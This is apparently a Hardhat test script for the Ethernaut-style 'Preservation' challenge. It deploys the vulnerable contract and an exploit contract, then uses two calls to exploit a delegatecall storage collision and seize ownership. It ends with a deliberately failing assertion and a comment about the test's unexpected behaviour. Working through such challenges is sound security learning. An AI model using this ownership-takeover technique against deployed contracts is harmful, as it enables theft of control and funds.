import { expect } from "chai";
import { ethers } from "hardhat";

describe("Preservation", function () {
  it("Should make me owner", async function () {
    // init
    const [ deployer ] = await ethers.getSigners();
    console.log("Deployer address: " + deployer.address);
    
    const lib1Contract = await (
      await ethers.getContractFactory("LibraryContract")
    ).deploy();
    await lib1Contract.deployed();

    const lib2Contract = await (
      await ethers.getContractFactory("LibraryContract")
    ).deploy();
    await lib2Contract.deployed();

    const contract = await (
      await ethers.getContractFactory("Preservation")
    ).deploy(lib1Contract.address, lib2Contract.address);
    await contract.deployed();
    console.log('Contract deployed at: '+ contract.address);

    // hack
    const exploitContract = await (
      await ethers.getContractFactory("PreservationExploit")
    ).deploy();
    await exploitContract.deployed();
    console.log('Contract deployed at: '+ exploitContract.address);    
    
    // 
    await contract.setSecondTime(exploitContract.address);

    await contract.setFirstTime(0);

    console.log(await contract.owner());
    console.log(await exploitContract.owner());

    // check
    expect(
      await contract.owner()
    ).to.equal(deployer.address);

    // if you remove unusedSlot1 and unusedSlot2
    // the test should fail but it dosen't
    expect(true).to.equal(false);
  });
});
